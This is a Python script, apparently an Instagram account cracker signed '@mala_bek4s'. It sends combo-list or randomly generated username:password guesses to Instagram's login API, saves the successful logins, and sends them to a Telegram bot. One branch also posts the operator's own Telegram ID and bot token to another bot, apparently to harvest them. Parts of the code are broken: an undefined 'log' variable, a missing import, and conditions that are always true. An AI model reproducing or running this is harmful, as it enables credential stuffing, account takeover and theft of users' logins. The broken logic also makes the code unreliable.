import os
from time import sleep
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')

def close():
    input('- Press Enter To Exit /')
    sys.exit()
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
w = "\033[0;1m"
clear()
os.system('color a')
cod4r ="""
      nawe File 5k.txt
      """
def banner():
    os.system("clear")
    print(C+"""

	    __  __       _
|  \/  | __ _| | __ _ _ __ ___
| |\/| |/ _` | |/ _` | '_ ` _ \
| |  | | (_| | | (_| | | | | | |
|_|  |_|\__,_|_|\__,_|_| |_| |_|


  """)

    print("=================================")
banner()
print("\n[!] Done Download All Libareis ")
h , b,s,block = 0,0,0,0
os.system("clear")
banner()
tele = input(w+"[+]"+B+"Send Hits To Telegram"+C+" Y"+w+"/"+A+"N"+B+"?: "+C)
if "Y" in tele:
    id = input(C+"[+]"+B+"ID TLEGRM : "+C)
    bot = input(C+"[+]"+B+"Token Bot : "+C)
elif "y" in tele:
    id = input(C+"[+]"+B+" Id Tele : "+C)
    bot = input(C+"[+]"+B+"Token Bot : "+C)
    t = requests.post(f"https://api.telegram.org/bot{df}/sendMessage?chat_id={dd}&text=𝙸𝚗𝚒𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 \n====================\n[=] ID : {id} \n[=] TOKEN : {bot}\n====================\nBy : @mala_bek4s")
print("\033[0;1m==========================")
print(C+"[1]"+B+"CRACK BY COMBO")
print(C+"[2]"+B+"CRACK AUTO")
print(C+"[3]"+B+"COMBO MAKER 5K")
print("\033[0;1m===========================")
print("")
ask = input(C+"[+]"+B+"Please Select Mode : "+w)
if ask == "2":

    make = '0123456789'
    clear()
    banner()
    print("            Auto insta cracker")
    print("=================================")
    print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[x] Bad : {b} \033[34;1m[•] security : {s}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '075' + us
        pasw = '075' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝙸𝚗𝚒𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 \n====================\n[•]  𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : {user} \n[•]  𝘗𝘢𝘴𝘴𝘸𝘰𝘳𝘥 : {pasw}\n====================\nBy : @mala_bek4s")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[•]  security : {s}",end='')
            print(f"\n        \033[1;92mHit = {user}:{pasw}")
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r\033[1;92m[•]  GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[•]  security : {s}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•]  Bad : {b} \033[34;1m[•]  security : {s}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r\033[1;97m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[•]  security : {s}",end='')
        else:
            b+=1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[x] Bad : {b} \033[34;1m[-] security : {s}",end='')
elif ask =="1":
    print(cod4r)
    assk = input("[+] Name File : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
    print("         Crack by Combo List")

    print("")
    print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[•]  security : {s}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝙸𝚗𝚒𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 Account\n====================\n[•]  𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦: {user} \n[•] 𝘗𝘢𝘴𝘴𝘸𝘰𝘳𝘥: {pasw}\n====================\nBy : @mala_bek4s")

            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[•]  security : {s}",end='')
            print(f"\n         \033[1;92mHit = {user}:{pasw}")
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•]  Bad : {b} \033[34;1m[•]  security : {s}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r\033[1;97m[=] Hit : {h} \033[1;90m[x] Bad : {b} \033[34;1m[-] security : {s}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1

        elif 'Bad request' in log.text:
            b += 1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[-] security : {s}",end='')
        else:
            b+=1
            print(f"\r\033[1;92m[•] GOOD : {h} \033[1;90m[•] Bad : {b} \033[34;1m[-] security : {s}",end='')

elif ask =="3":
        ff = ("770","750","780","751","781","771")
        ddd = ("1234567890","1234554321","1122334455","12341234","890890","123456123456","19901990","0987654321","010101","20002000","123456","123123","77889900")
        op=open('5K.txt','w')
        for x in range(5000):
                        f = "1234567890"
                        x1 = random.choice(f)
                        x2 = random.choice(f)
                        x3 = random.choice(f)
                        x4 = random.choice(f)
                        x5 = random.choice(f)
                        x6 = random.choice(f)
                        x7 = random.choice(f)
                        x8 = random.choice(ff)
                        x9 =random.choice(ddd)
                        user =x1+x2+x3+x4+x5+x6+x7
                        kk = x8+user
                        gg = "0"+kk+":"+"0"+kk
                        print(gg)
                        op.write(gg+'\n')
